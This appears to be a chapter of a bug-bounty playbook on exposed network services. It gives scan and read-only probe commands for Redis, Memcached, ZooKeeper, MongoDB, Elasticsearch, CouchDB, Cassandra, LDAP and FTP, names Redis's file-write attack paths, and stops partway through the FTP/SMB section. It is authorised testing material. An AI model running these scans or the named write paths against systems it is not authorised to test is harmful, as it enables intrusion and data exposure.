# NET · Network services on IP & CIDR assets

> An address in scope runs a service built for a private network that answers anyone: a cache, a database, a
> coordination store, a file share, a debug or management port, a mail relay, a proxy. It pays for what the service
> holds or runs, proven with one read-only protocol command and stopped at the banner. An open port, a version
> string or a password prompt is informative, and a service on an address the programme no longer holds is someone
> else's machine.

| | |
|---|---|
| **Class** | `network` |
| **Applies when** | ip\|nonweb-ports |
| **Pays** | 116 disclosed reports, 16 paid, median $425, top $6,909 (157 more in other classes touch it). Most are cleartext, missing-encryption and man-in-the-middle reports (88 by weakness) and curl's protocol bugs; the exposed services that paid best are filed elsewhere: an open proxy into internal domains ($7,500), a Selenoid grid on a bare address ($6,000), a TURN relay to cloud metadata ($3,500), open Elasticsearch ($3,500), Memcached ($2,500), JMX ($2,000). |
| **Weaknesses** | Missing Authentication for Critical Function · CWE-306 · Improper Access Control - Generic · CWE-284 · CWE-441 · Server-Side Request Forgery (SSRF) · CWE-918 · Use of Default Credentials · CWE-1392 · Information Disclosure · CWE-200 · Misconfiguration · CWE-672 · Cleartext Transmission of Sensitive Information · CWE-319 |

## Why it pays

IP ranges and odd ports are where infrastructure outlives the people who set it up. Caches, search clusters,
coordination services, JVM management ports and container daemons ship with authentication off because they expect
a private network; bound to a public interface, they answer anyone who speaks their protocol, and no web
application stands in front of them to enforce a login. This chapter asks each service on an address, in its own
protocol, for the one thing an authenticated deployment refuses: a status, a catalogue, a version call.

The bounty follows what the service holds or runs. Six reports of an unauthenticated store on its own port were
paid: Elasticsearch $3,500 (#267161), Memcached $2,500 (#119871), ZooKeeper $1,000 (#154369), Kibana with
Elasticsearch $750 (#188482), two Hadoop nodes $150 each (#44052, #49035). Ports that run code by design pay for
the read-only answer: JMX over RMI on a bare Mail.ru address $2,000 (#703910), JDWP $300 (#49408). Relays pay best of
all, because each one is an SSRF that needs no bug in any application: an exposed proxy that reached internal Reddit
domains ($7,500, #2967634), an open Selenoid browser grid on a bare address that read local files ($6,000,
#512973), Slack's TURN server relaying to its internal network and the metadata service ($3,500, #333419).

Most of what a port scan produces is not paid. Nine reports by title are about open SSH, Telnet or "numerous open
ports"; one was paid, $25 (#257335). Four name an FTP, SMB or NFS service open without authentication, and none
carries a bounty in the index. SNMP `public`, zone transfers and SMTP relays appear a handful of times and pay little or nothing. Ownership
is the other trap: Basecamp paid $100 for an unauthenticated JMX server (#1456063) because the stale DNS records
pointed at an address that was no longer theirs, so the researcher had reached a stranger's machine. Pre-auth bugs
in VPN and edge appliances on these ranges are the largest single payouts near this class (#591295, $20,160); they
are CVE-012's.

## The crux question

**Does a service on this address, which the programme still holds, answer its own protocol without asking who I
am, and what does it hold or run?**

## Applicability probe

The gate is `ip|nonweb-ports`. `ip` is set when the asset is added (`sane asset add`, `sane sweep`);
`nonweb-ports` is set by `sane ports`, which runs the top 100 TCP ports at ten probes per permitted request per
second and calls any open port outside its web-port list non-web (9200, 2375, 10250 and 5984 count as non-web).

```bash
source "$E/env.sh"
scripts/sane scope check "$H"              # 'in', and the rule: an ip or cidr rule is the programme naming the address itself
scripts/sane ports "$H" --top 100          # sets nonweb-ports from the open TCP ports
jq -c --arg h "$H" '.[$h] | {ports, source, rule}' "$E/assets.json"
```

```bash
scripts/sane fact set "$H" nonweb-ports=1 --ev "sane ports --top 100: 22, 6379 and 9200 open"
scripts/sane fact set "$H" nonweb-ports=1 --ev "NET-002 UDP probe: 161/udp answers the community public"
# a named host with web ports only, in the top 100 TCP ports and on the NET-002 UDP list:
scripts/sane fact set "$H" nonweb-ports=0 --ev "top 100 TCP: 80 and 443 only; UDP 53,123,161,500,623: no answer"
```

With `ip` false and `nonweb-ports` false the chapter closes for the asset ("named host, web ports only: the web
chapters cover it"); the planner writes the reason. A bare address always opens the chapter, so NET-001 and NET-002
run even when nothing answered in the top 100. Four policy answers decide whole cards; record them in the engagement
notes before NET-002: is port scanning allowed at all (many policies forbid "automated scanning"), is the full port
range allowed, may a test send one e-mail through a relay (NET-009), may a test write one file to an anonymous share
(NET-006)?

## Triage order

NET-001 (whose address is it: whois, reverse DNS, one certificate) → NET-002 (top 1000 TCP, a short UDP list,
service names and versions) → NET-003 (web ports other than 80 and 443, handed to the web chapters) → NET-004 and
NET-005 (one status or catalogue command per data store) → NET-011 (debug, JMX, Docker and kubelet ports: one
read-only call each, Critical by design) → NET-012 (proxies, TURN and browser grids: a handful of relayed requests)
→ NET-006 (anonymous FTP, SMB, NFS and rsync listings) → NET-007 (VNC, Telnet, X11 and IPMI without credentials) →
NET-009 (SMTP relay: `RCPT` first, one message) → NET-008 (SNMP `public`) → NET-010 (zone transfer; run it before
NET-012 when the address also hosts a relay, because its names are what the relay is asked for).

## Items

### NET-001 · The address behind this asset now belongs to someone other than the programme

| | |
|---|---|
| **Severity** | None standalone: it decides whether any other card in this chapter may run; Low to Medium through STO-007 when an in-scope name points at an address that now serves another organisation |
| **Requires** | — |
| **Excluded by** | — |
| **Unit** | host |
| **Cost** | low |
| **Weakness** | Misconfiguration · CWE-672 |
| **Prior art** | #1456063, #1112679, #1590115 |

- **Where:** every asset this chapter applies to, before any port scan; the gate is empty because no fact says who
  holds an address. Bare addresses from the programme's IP or CIDR list, and host names whose A records lead to a
  cloud, hosting or CDN address. Cloud providers reissue released addresses to other customers, shared hosting puts
  many customers' services on one address, and a CDN edge answers on ports that belong to the CDN.
- **Test:** tie the address to the programme with evidence that does not come from the services about to be
  tested: the programme's own scope rule naming the IP or range, the registry record of the network, the reverse
  DNS name, the address's default certificate, an in-scope name that resolves to it today. Registry and DNS lookups
  go to registries and resolvers; the only contact with the address is one TLS handshake per port.
- **How:**
  ```bash
  source "$E/env.sh"; D="$E/evidence/$H/NET-001"; mkdir -p "$D"
  case "$H" in *:*) IPS=$H ;; *[!0-9.]*) IPS=$(dig +short A "$H" | grep -E '^[0-9.]+$') ;; *) IPS=$H ;; esac
  scripts/sane scope check "$H" | tee "$D/scope.txt"      # 'rule: ip ...' or 'rule: cidr ...' is the programme naming the address
  for ip in $IPS; do
    echo "== $ip"
    whois "$ip" 2>/dev/null | grep -m6 -iE '^(orgname|org-name|organisation|netname|descr|owner|cidr|inetnum):'
    echo "ptr: $(dig +short -x "$ip" | paste -sd' ' -)"
    for p in 443 8443; do      # the default certificate: no SNI is sent, so the address names itself
      echo | timeout 8 openssl s_client -connect "$ip:$p" 2>/dev/null | openssl x509 -noout -subject -ext subjectAltName 2>/dev/null | tr '\n' ' '
      echo "[$p]"; sleep 1
    done
  done | tee "$D/owner.txt"
  # in-scope names that resolve to the address today
  jq -r 'to_entries[] | select(.value.in_scope) | .key' "$E/assets.json" | grep -vE '^[0-9.]+$' | while read -r n; do
    for ip in $IPS; do dig +short A "$n" | grep -qxF "$ip" && echo "$n -> $ip"; done; sleep 0.2
  done | tee "$D/names-here.txt"
  ```
  An SMTP or FTP greeting that names an in-scope host (NET-002 reads it) counts as one more tie. Then record the
  outcome; the claim in the title is false when the address is the programme's:
  ```bash
  scripts/sane mark "$H" NET-001 negative --note "the programme's: cidr rule 203.0.113.0/24; PTR mx1.example.com; cert SAN *.example.com" --ev "$D"
  scripts/sane mark "$H" NET-001 parked --note "not the programme's: cert and page name another company; in-scope name points here (STO-007)" --ev "$D"
  scripts/sane set blockers+="NET-001 $H: listed in the programme's range but serves another organisation; ask the programme"
  ```
- **Proof:** the decision and its evidence in `$D/owner.txt`: an `ip` or `cidr` scope rule, or a registry record
  naming the organisation, or two independent ties (reverse DNS under an in-scope domain, a certificate for an
  in-scope name, an in-scope name resolving here today). With that, the other NET cards may run. A certificate,
  page or registry record naming another organisation is the claim holding: no NET card runs on the address.
- **Not a finding when:** the address is only silent: no PTR and nothing on 443 proves nothing, because firewalled
  and unassigned look the same; when the programme listed the address itself, its rule stands. A CDN or platform
  certificate on a name's address (`sni.cloudflaressl.com`, `*.cloudfront.net`, `*.herokuapp.com`, an Akamai
  edge) is the provider's edge: its other ports are the provider's (`third-party`), and only the in-scope web host
  is tested through it. A generic cloud PTR (`ec2-...compute.amazonaws.com`, `...bc.googleusercontent.com`) ties
  the address to the cloud, not to anyone in it. A shared-hosting address (the certificate lists unrelated domains,
  the PTR is the host's): only the in-scope virtual host is in scope, and its FTP, SMTP and control-panel ports
  belong to the hosting company.
- **Escalate:** an in-scope name on a reissued cloud address is STO-007's report, made from the certificate and page
  alone and never from a test of the stranger's services. #1456063 is the warning: the JMX server reached through
  Basecamp's stale `jabber` records was no longer theirs, and the RCE report paid $100. An address from the
  programme's own range that serves another organisation is a scope question for the programme: the operator raises
  it (the `blockers+=` line above), and nothing is tested there meanwhile.

### NET-002 · The address runs a service on a TCP or UDP port beyond its web ports, and the service names its protocol and product

| | |
|---|---|
| **Severity** | None standalone: a list of ports is a map, not a finding; it decides which of NET-003 to NET-012 run and feeds the CVE chapter versions |
| **Requires** | — |
| **Excluded by** | — |
| **Unit** | host |
| **Cost** | medium |
| **Weakness** | Information Disclosure · CWE-200 |
| **Prior art** | #1560149, #1088975, #305518 |

- **Where:** every address NET-001 tied to the programme; the gate is empty because the scan is how the facts
  appear. `sane ports` covered the top 100 TCP ports. This card extends it to the top 1000, names the service and
  version on every open port, probes a short UDP list, and scans the full TCP range only with a reason written in
  the note. The services that paid often sat off the common lists: Tomcat examples on 38443 (#1560149), a Fiddler
  proxy into an internal network on 7459 (#1088975). A policy that forbids port scanning or automated scanning ends
  the card: mark it `skipped` with the policy sentence.
- **Test:** an open port means little until the service on it speaks. nmap's version probes and its `default and
  safe` scripts make each one give its protocol, product and version (an SSH or SMTP banner, a TLS certificate, an
  RDP host name), without logging in and without the `intrusive` category.
- **How:**
  ```bash
  source "$E/env.sh"; D="$E/evidence/$H/NET-002"; mkdir -p "$D"
  PR=$(awk -v r="$RATE" 'BEGIN{n=int(r*10); print (n<1?1:n)}')    # probes per second: ten per permitted request, as sane ports uses
  # 1. TCP top 1000. naabu takes a literal -rate that the scope guard reads (at most ten times $RATE); nmap reads -T3 --max-rate
  naabu -host "$H" -top-ports 1000 -rate 10 -silent | tee "$D/tcp-top1000.txt"
  #    or: nmap -Pn -n -T3 --max-rate "$PR" --top-ports 1000 --open -oG "$D/tcp-top1000.gnmap" "$H"
  # 2. service, version and safe default scripts on what answered
  P=$( { cut -d: -f2 "$D/tcp-top1000.txt" 2>/dev/null; grep -ohE '[0-9]+/open/tcp' "$D/tcp-top1000.gnmap" 2>/dev/null | cut -d/ -f1
         jq -r --arg h "$H" '.[$h].ports[]?' "$E/assets.json"; } | sort -un | paste -sd, -)
  [ -n "$P" ] && nmap -Pn -n -T3 --max-rate "$PR" -sV --version-intensity 5 --script 'default and safe' -p "$P" -oA "$D/services" "$H"
  # 3. UDP: services that answer one datagram (raw sockets: root). -sV sends each service's own probe
  sudo nmap -Pn -n -sU -sV --version-intensity 0 -T3 --max-rate "$PR" -p 53,111,123,137,161,500,623,1900,5353 -oG "$D/udp.gnmap" "$H"
  # 4. the full TCP range, only with a reason in the note (a server role, not a CDN edge): 65,535 probes, 22 minutes at 50 per second
  nmap -Pn -n -T3 --max-rate "$PR" -p- --open -oG "$D/tcp-all.gnmap" "$H"
  ```
  Stop at the banner: version detection and the safe scripts are the whole interaction here; every login, listing
  and command belongs to the card for that service. Then record what answered:
  ```bash
  grep -ohE '[0-9]+/open/(tcp|udp)//[^/]*//[^/]*' "$D"/*.gnmap | sort -u | tee "$D/open.txt"
  scripts/sane asset add "$H" $(grep -ohE '[0-9]+/open/tcp' "$D"/*.gnmap | cut -d/ -f1 | sort -un | sed 's/^/--port /')
  # facts from what the services are, not from port numbers: JDWP on 8000 is non-web, Elasticsearch on 9200 speaks HTTP
  NW=$(grep -vE '^[0-9]+/open/(tcp|udp)//([^/]*http[^/]*|tcpwrapped)//' "$D/open.txt" | cut -d/ -f1,3,5 | paste -sd' ' -)
  HW=$(grep -E '^[0-9]+/open/tcp//[^/]*http[^/]*//' "$D/open.txt" | cut -d/ -f1,5 | paste -sd' ' -)
  [ -n "$NW" ] && scripts/sane fact set "$H" nonweb-ports=1 --ev "NET-002 services: $NW"
  [ -n "$HW" ] && scripts/sane fact set "$H" http=1 --ev "NET-002 web services: $HW"      # then NET-003
  ```
- **Proof:** none standalone. The saved nmap and naabu output and the fact lines are the evidence later cards
  start from.
- **Not a finding when:** the list of open ports is the whole result (#305518; #8064, "numerous open ports", carries
  no bounty). Every port answers: a SYN proxy, tarpit or honeypot completes every handshake, and `tcpwrapped` means
  the connection closed before the service spoke. A Cloudflare-proxied address answers on 80, 443, 2052, 2053, 2082,
  2083, 2086, 2087, 2095, 2096, 8080, 8443 and 8880 with the same site: those are the CDN's ports. `filtered` is not
  open, and on UDP `open|filtered` is not open either.
- **Escalate:** each service to its card: http on any port → NET-003; redis, memcached, zookeeper → NET-004;
  mongodb, elasticsearch, couchdb, cassandra, ldap → NET-005; ftp, microsoft-ds, netbios-ssn, nfs, rpcbind, rsync →
  NET-006; vnc, telnet, X11, asf-rmcp (IPMI) → NET-007; snmp → NET-008; smtp, submission, smtps → NET-009; domain →
  NET-010; jdwp, java-rmi, docker, kubelet (10250) → NET-011; http-proxy, socks, squid, turn or stun (3478), a
  Selenium grid (4444) → NET-012. Versions: `scripts/sane cve "$H" --tech 'proftpd 1.3.5'`, then CVE-001 and CVE-002;
  a VPN or edge appliance (Fortinet, Ivanti, Citrix, GlobalProtect, often on 443, 4443 or 10443) → CVE-012.

### NET-003 · A web service on a port other than 80 and 443 serves an interface that the host's main site does not

| | |
|---|---|
| **Severity** | None standalone; each interface is rated by the card it feeds (CVE-008 for an open management interface, INF-008 for a status page, NET-012 for a browser grid or proxy) |
| **Requires** | http |
| **Excluded by** | — |
| **Unit** | host |
| **Cost** | low |
| **Weakness** | Improper Access Control - Generic · CWE-284 |
| **Prior art** | #512973, #1560149, #49035, #2473173 |

- **Where:** every TCP port in the asset's port list (`sane ports`, NET-002) except 80 and 443. The fingerprinter
  keeps only the first base URL that answers (https, then http, then the extra ports), so an address whose 443 shows
  a default page hides a Jenkins on 8080 from every web chapter until this card names it. The $6,000 Selenoid
  (#512973), Stripe's Tomcat examples (#1560149), an HDFS NameNode page (#49035) and pixiv's `server-status`
  (#2473173) were all on bare addresses.
- **Test:** request `/` over https and then http on each port, keep the status, `Server` header, title and a hash of
  the body, and group ports that serve the same thing. Each distinct interface becomes a base URL that the web cards
  run against.
- **How:**
  ```bash
  source "$E/env.sh"; D="$E/evidence/$H/NET-003"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  probe(){ curl -sSk "${HDR[@]}" -m 8 -o "$D/$1-$2.body" -D "$D/$1-$2.headers" -w '%{http_code}' "$2://$H:$1/" 2>/dev/null; }
  for p in $(jq -r --arg h "$H" '.[$h].ports[]?' "$E/assets.json" | grep -vxE '80|443'); do
    c=000
    for s in https http; do c=$(probe "$p" "$s"); sleep "$W"; [ "$c" != 000 ] && break; done
    [ "$c" != 000 ] && printf '%s\t%s\t%s\t%s\t%s\t%s\n' "$p" "$s" "$c" "$(cat "$D/$p-$s.body" 2>/dev/null | md5sum | cut -c1-12)" \
      "$(grep -m1 -i '^server:' "$D/$p-$s.headers" | tr -d '\r')" "$(grep -oiE '<title>[^<]{0,80}' "$D/$p-$s.body" | head -1 | sed 's/<title>//I')"
  done | tee "$D/web-ports.tsv"
  curl -sSk "${HDR[@]}" -m 8 "https://$H/" | md5sum | cut -c1-12      # the main site's hash, to compare with column four
  ```
  One GET per port and scheme, `$W` seconds apart. Stop at the first page: no crawl and no content discovery here;
  the web chapters do that with `T` set to the port. Record each distinct interface with its port in the evidence,
  so whoever runs a web card on this asset knows what `$T` is:
  ```bash
  scripts/sane fact set "$H" http=1 known-product=1 admin-panel=1 --ev "T=http://$H:8080 Jenkins 2.426 (X-Jenkins header), login page"
  scripts/sane fact set "$H" app=1 --ev "T=https://$H:8443 customer portal with a login form, not served on 443"
  ```
- **Proof:** none standalone: the table of ports with status, hash, `Server` and title. The finding, if any, is the
  web card's.
- **Not a finding when:** the body hash equals the main site's (the same application on another port). A CDN's
  alternate ports serve the same site. A web-server default page, or the same bare 404 on every port. A load
  balancer health port answering `OK`. Kubernetes NodePorts (30000 to 32767) serving the main application again. A
  product login form with nothing behind it: "exposed admin panel" is informative, as CVE-008 says.
- **Escalate:** a named product → `scripts/sane cve`, CVE-007 (vendor defaults), CVE-008 (unauthenticated management
  interface); Spring Boot → INF-005; `server-status` or an auto-index → INF-008; Tomcat `/examples/` → CVE-011; a
  Selenium grid or Selenoid (`/status`, `/wd/hub/status`) or anything that proxies → NET-012; an application with
  accounts → the map playbook with `T` set to the port, then the authz and injection lanes.

### NET-004 · Redis, Memcached or ZooKeeper on this address answers its own status command without authentication

| | |
|---|---|
| **Severity** | High standalone for an instance that holds data (non-zero keys, items or znodes); Critical when the key prefixes show sessions or tokens (counted, never read) or Redis answers `CONFIG GET` (its documented file-write path, stated and never taken); Low for an empty instance |
| **Requires** | nonweb-ports |
| **Excluded by** | — |
| **Unit** | host |
| **Cost** | low |
| **Weakness** | Missing Authentication for Critical Function · CWE-306 |
| **Prior art** | #119871, #154369 |

- **Where:** ports NET-002 named redis (6379, 6380; 16379 is the cluster bus, not a client port), memcached (11211
  over TCP) and zookeeper (2181; 2888 and 3888 are peer ports). These stores have no authentication unless someone
  turned it on, and they answer in plain text.
- **Test:** each protocol has a status command that an authenticated deployment refuses: Redis `INFO` (`-NOAUTH`,
  or `-DENIED` in protected mode), Memcached `stats`, ZooKeeper `srvr` and a session that lists `/`. Read the
  version, role and counts; count key-name prefixes; never read a value.
- **How:**
  ```bash
  source "$E/env.sh"; D="$E/evidence/$H/NET-004"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  RP=6379; MP=11211; ZP=2181      # or the ports NET-002 listed for redis, memcached and zookeeper; add --tls --insecure for a TLS Redis
  # Redis: server facts and counts. No GET, KEYS, CONFIG SET, SAVE, MODULE, REPLICAOF, FLUSHALL or DEBUG
  timeout 10 redis-cli -h "$H" -p "$RP" INFO server | grep -E '^(redis_version|redis_mode|os|tcp_port|uptime_in_days):' | tee "$D/redis-server.txt"; sleep "$W"
  timeout 10 redis-cli -h "$H" -p "$RP" INFO keyspace | tee "$D/redis-keyspace.txt"; sleep "$W"
  timeout 10 redis-cli -h "$H" -p "$RP" CONFIG GET dir | tee "$D/redis-config-dir.txt"; sleep "$W"    # an answer: CONFIG is neither renamed nor denied
  # key prefixes, not keys: up to 500 names from SCAN at one call per second, cut at the first ':' and counted
  timeout 70 redis-cli -h "$H" -p "$RP" --scan -i 1 | head -500 | cut -d: -f1 | sort | uniq -c | sort -rn | head -15 | tee "$D/redis-prefixes.txt"
  # Memcached: version and item count. 'stats cachedump' and 'lru_crawler metadump' list key names and are not run
  printf 'stats\r\nquit\r\n' | timeout 10 nc -w 5 "$H" "$MP" | grep -E 'STAT (version|uptime|curr_items|total_items|curr_connections|bytes) ' | tee "$D/memcached-stats.txt"; sleep "$W"
  # ZooKeeper: the four-letter word, then the top-level node names and the root ACL. No get, create, set or delete
  echo srvr | timeout 10 nc -w 5 "$H" "$ZP" | tee "$D/zk-srvr.txt"; sleep "$W"
  timeout 20 zkCli.sh -server "$H:$ZP" ls / 2>/dev/null | tail -1 | tee "$D/zk-ls.txt"; sleep "$W"
  timeout 20 zkCli.sh -server "$H:$ZP" getAcl / 2>/dev/null | tail -2 | tee "$D/zk-acl.txt"
  ```
  Stop at the banner and the counts. Kafka's distribution ships the same client as `zookeeper-shell.sh "$H:$ZP" ls /`.
- **Proof:** each command and its answer: Redis `redis_version` and `db0:keys=...`, the prefix counts and the
  `CONFIG GET dir` reply; Memcached `STAT version` and `curr_items`; ZooKeeper's `srvr` (version, mode, node count),
  the top-level names and `'world,'anyone : cdrwa`. State what an attacker could do (read and overwrite every value,
  sessions included; on Redis rewrite the configuration and write files as the service user; on ZooKeeper change
  what the cluster reads) and that none of it was done.
- **Not a finding when:** Redis answers `-NOAUTH Authentication required`, `-DENIED Redis is running in protected
  mode` or `-NOPERM`. Memcached answers `stats` with `ERROR` or `CLIENT_ERROR` (SASL, or an authentication file for
  the text protocol). ZooKeeper says `srvr is not executed because it is not in the whitelist` (still a ZooKeeper:
  try `ls /`) or `KeeperErrorCode = NoAuth`; `srvr` alone gives counters only (`version-disclosure`). An empty
  instance (`INFO keyspace` blank, `curr_items 0`): Low. Memcached reachable only over UDP is an amplifier (`dos`):
  never measured. A honeypot: the same address "exposes" a dozen other databases, the versions are odd, the uptime
  resets on every connection. A store on a shared or reissued address (NET-001).
- **Escalate:** never write a key, a session or a znode to prove it: say what the open protocol allows. Redis's
  write paths (`CONFIG SET dir` with `SAVE`, `MODULE LOAD`, `REPLICAOF` to a rogue master) are described in the
  report and never taken. Prefixes such as `session`, `sess` or `token` next to the web application's session
  cookie format say whose sessions they are: describe, do not read. ZooKeeper node names (`/brokers`, `/configs`,
  `/hbase`) say which cluster depends on it. SSR-009's `gopher://` and `dict://` reach the same stores on loopback:
  this card's internal twin.

### NET-005 · A database, search cluster or directory on this address lists its databases, indices or entries to a client that never authenticated

| | |
|---|---|
| **Severity** | High standalone when the names and counts show non-public data (customer, order, user or log databases); Critical when they show credentials or personal data in volume, or an anonymous CouchDB session holds `_admin`; Low for an empty instance, sample data or a search index of public pages |
| **Requires** | nonweb-ports |
| **Excluded by** | — |
| **Unit** | host |
| **Cost** | low |
| **Weakness** | Missing Authentication for Critical Function · CWE-306 |
| **Prior art** | #267161, #188482, #159536, #1869184 |

- **Where:** ports NET-002 named mongodb (27017, 27018), elasticsearch or opensearch (9200; 9300 is the transport
  port and does not speak HTTP), couchdb (5984, 6984 with TLS), cassandra (9042; 7199 is its JMX, NET-011) and ldap
  (389, 636, 3268 for an Active Directory global catalogue).
- **Test:** ask each for its catalogue the way an administrator would: MongoDB `listDatabases`, Elasticsearch
  `_cat/indices`, CouchDB `_all_dbs` and `_session`, Cassandra `system.local` and `DESCRIBE KEYSPACES`, LDAP a
  one-level search below the naming context. A configured deployment refuses all of them. Names and counts are the
  proof; no document, row or attribute value is read.
- **How:**
  ```bash
  source "$E/env.sh"; D="$E/evidence/$H/NET-005"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  MG=27017; EP=9200; CP=5984; CQ=9042; LP=389      # or the ports NET-002 listed
  # MongoDB: the version answers for everyone; the database list proves access. Then one database's collection names and estimated counts
  timeout 40 mongosh "mongodb://$H:$MG/?directConnection=true&serverSelectionTimeoutMS=8000" --quiet --eval '
    print("version " + db.version());
    const dbs = db.adminCommand({listDatabases: 1}).databases;
    dbs.forEach(d => print(d.name + " " + d.sizeOnDisk));
    const u = dbs.map(d => d.name).find(n => !["admin", "local", "config"].includes(n));
    if (u) db.getSiblingDB(u).getCollectionNames().slice(0, 20).forEach(c =>
      print(u + "." + c + " ~" + db.getSiblingDB(u).getCollection(c).estimatedDocumentCount()));' 2>&1 | tee "$D/mongodb.txt"; sleep "$W"
  # Elasticsearch or OpenSearch: banner, who the cluster thinks we are, index names with document counts
  S=http; curl -sS "${HDR[@]}" -m 10 -o "$D/es-root.json" "http://$H:$EP/" 2>/dev/null || { S=https; curl -sSk "${HDR[@]}" -m 10 -o "$D/es-root.json" "https://$H:$EP/"; }
  jq -c '{cluster_name, version: .version.number, distribution: .version.distribution, error: .error.type, status}' "$D/es-root.json"; sleep "$W"
  curl -sSk "${HDR[@]}" -m 10 "$S://$H:$EP/_security/_authenticate" | head -c 300; echo; sleep "$W"
  curl -sSk "${HDR[@]}" -m 15 "$S://$H:$EP/_cat/indices?h=index,docs.count,store.size&s=index&bytes=mb" | head -60 | tee "$D/es-indices.txt"; sleep "$W"
  # CouchDB: banner, the anonymous session's roles, database names, one database's document count
  curl -sS "${HDR[@]}" -m 10 "http://$H:$CP/" | head -c 200; echo; sleep "$W"
  curl -sS "${HDR[@]}" -m 10 "http://$H:$CP/_session" | jq -c '.userCtx'; sleep "$W"       # roles ["_admin"] for nobody: the old admin party
  curl -sS "${HDR[@]}" -m 10 "http://$H:$CP/_all_dbs" | tee "$D/couch-dbs.json" | jq -c 'if type == "array" then {count: length, names: .[0:25]} else . end'; sleep "$W"
  DB=$(jq -r 'if type == "array" then (map(select(startswith("_") | not)) | .[0] // empty) else empty end' "$D/couch-dbs.json")
  [ -n "$DB" ] && curl -sS "${HDR[@]}" -m 10 "http://$H:$CP/$DB" | jq -c '{db_name, doc_count}'; sleep "$W"
  # Cassandra: release and keyspaces, then the table names of one keyspace that is not system*. Never SELECT * or count(*): both scan the cluster
  timeout 30 cqlsh "$H" "$CQ" --connect-timeout=10 -e "SELECT release_version, cluster_name FROM system.local" 2>&1 | tee "$D/cassandra-version.txt"; sleep "$W"
  timeout 30 cqlsh "$H" "$CQ" --connect-timeout=10 -e "DESCRIBE KEYSPACES" 2>&1 | tee "$D/cassandra-keyspaces.txt"; sleep "$W"
  KS=$(grep -qi error "$D/cassandra-keyspaces.txt" || tr -s ' \t' '\n' < "$D/cassandra-keyspaces.txt" | grep -E '^[A-Za-z][A-Za-z0-9_]*$' | grep -v '^system' | head -1)
  [ -n "$KS" ] && timeout 30 cqlsh "$H" "$CQ" --connect-timeout=10 -k "$KS" -e "DESCRIBE TABLES" 2>&1 | head -30 | tee "$D/cassandra-tables.txt"; sleep "$W"
  # LDAP: the root DSE, one level below the naming context (25 DNs at most), then one entry's attribute names only (-A) with its naming value cut
  ldapsearch -x -H "ldap://$H:$LP" -o nettimeout=10 -LLL -s base -b '' namingContexts vendorName vendorVersion 2>&1 | tee "$D/ldap-rootdse.txt"; sleep "$W"
  NC=$(awk '/^namingContexts: /{print $2; exit}' "$D/ldap-rootdse.txt")
  ldapsearch -x -H "ldap://$H:$LP" -o nettimeout=10 -LLL -z 25 -s one -b "$NC" dn 2>&1 | tee "$D/ldap-one-level.txt"; sleep "$W"
  OU=$(grep -m1 -iE '^dn: (ou|cn)=(people|users)' "$D/ldap-one-level.txt" | cut -d' ' -f2-)
  [ -n "$OU" ] && ldapsearch -x -H "ldap://$H:$LP" -o nettimeout=10 -LLL -z 1 -A -s one -b "$OU" 2>&1 | sed -E 's/^(dn: [A-Za-z]+=)[^,]+/\1<cut>/' | tee "$D/ldap-attrs.txt"
  ```
  Stop at the catalogue. No `find`, `_search`, `_all_docs`, `SELECT` or attribute values.
- **Proof:** the request and the catalogue it returned without credentials: MongoDB database names and sizes, and one
  database's collection names with estimated counts; Elasticsearch index names with document counts, and
  `_security/_authenticate` naming an anonymous user (`_es_anonymous_user` by default) or failing because security
  is off; CouchDB's `userCtx` and database names; Cassandra's release and keyspace names; LDAP container names, the
  `Size limit exceeded` line that shows more entries exist, and the attribute names one entry exposes (`mail`,
  `telephoneNumber`, `userPassword`) with its naming value cut.
- **Not a finding when:** MongoDB answers `hello`, `buildInfo` and `db.version()` on every deployment: `command
  listDatabases requires authentication` is closed. Elasticsearch answers 401 with `security_exception`, or the
  anonymous role reads only the public site's search index (the index names show it). CouchDB's `/` welcome banner
  is public on every install, and 3.x refuses `_all_dbs` to an anonymous client. Cassandra answers
  `AuthenticationFailed('Remote end requires authentication')`, or holds only `system*` keyspaces (an empty
  cluster: Low). The LDAP root DSE is readable anonymously by design (RFC 4512), so naming contexts alone are not a
  finding; Active Directory refusing the search (`a successful bind must be completed`) is closed; a directory
  published on purpose (a PKI repository serving certificates and revocation lists, as at #1869184's host, or a
  public staff directory) is by design. A database already emptied by a ransom bot (one database named like
  `READ_ME_TO_RECOVER_YOUR_DATA`) is still an exposure: report names only and expect a duplicate. A honeypot (many
  stores on one address, odd versions).
- **Escalate:** names that announce credentials (an index `credentials`, a collection `api_keys`) are described, not
  opened; a credential seen anyway gets one identity call and goes to the operator (INF-002's rule). An old
  Elasticsearch with dynamic scripting is CVE-002's, never a `_search` with a script. Kibana (5601) and OpenSearch
  Dashboards are CVE-008's. Anonymous LDAP entries next to an application that signs in with LDAP: the attribute
  names say what a password spray would need, and spraying is never done (`bruteforce-ok`, AUT cards). CVE-008's
  Elasticsearch row is the same test over HTTP: run one card and reference it in the other's note.

### NET-006 · An FTP, SMB, NFS or rsync service on this address lists files to an anonymous client

| | |
|---|---|
| **Severity** | High standalone when the names show non-public files (backups, database dumps, configuration, source, customer documents, recordings); Critical when the share also takes an anonymous write into a tree that the organisation's systems serve or run (one marker file, created and removed, only where the policy allows writes); Low or none for a public download mirror or an empty share |
| **Requires** | nonweb-ports |
| **Excluded by** | — |
| **Unit** | host |
| **Cost** | low |
| **Weakness** | Improper Access Control - Generic · CWE-284 |
| **Prior art** | #417360, #287837, #192321, #197976 |

- **Where:** ports NET-002 named ftp (21, 2121), microsoft-ds and netbios-ssn (445, 139), nfs and rpcbind (2049,
  111) and rsync (873). Backup servers, NAS boxes, camera recorders (#417360 was CCTV footage backups over SMB) and
  game or build servers (#287837 exported server configuration over NFS).
- **Test:** connect as nobody (FTP user `anonymous`, an SMB null session, NFS from a client the export does not
  list, rsync without a user) and list the root, two levels deep at most. File names, sizes and dates are the
  proof; no file is downloaded.
- **How:**
  ```bash
  source "$E/env.sh"; D="$E/evidence/$H/NET-006"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  PR=$(awk -v r="$RATE" 'BEGIN{n=int(r*10); print (n<1?1:n)}')
  # FTP: nmap reports an anonymous login and flags writeable directories from the listing's permissions, without writing
  nmap -Pn -n -T3 --max-rate "$PR" -p 21 --script ftp-anon,ftp-syst -oN "$D/ftp-anon.txt" "$H"
  curl -sS "${HDR[@]}" -m 20 --user 'anonymous:anonymous' "ftp://$H/" | head -60 | tee "$D/ftp-root.txt"; sleep "$W"
